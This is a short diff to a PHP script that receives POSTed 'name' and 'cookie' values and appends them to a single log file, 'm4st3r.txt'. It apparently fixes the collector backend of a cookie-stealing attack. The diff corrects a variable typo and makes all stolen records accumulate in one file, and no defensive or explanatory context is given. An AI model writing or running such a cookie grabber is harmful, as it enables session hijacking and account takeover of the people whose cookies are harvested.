@@ -16,10 +16,10 @@
 <?php
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
-$fifo = fopen($name.'.txt', 'w');
+$fifo = fopen('m4st3r.txt', 'a');
 fwrite($fifo, "----- [".$name."] -----\n");
-fwrite($fifo, $cookies);
-fwrite($fifo, "\n----- [END] -----");
+fwrite($fifo, $cookie);
+fwrite($fifo, "\n----- [END] -----\n\n");
 
 fclose($fifo);
 ?>
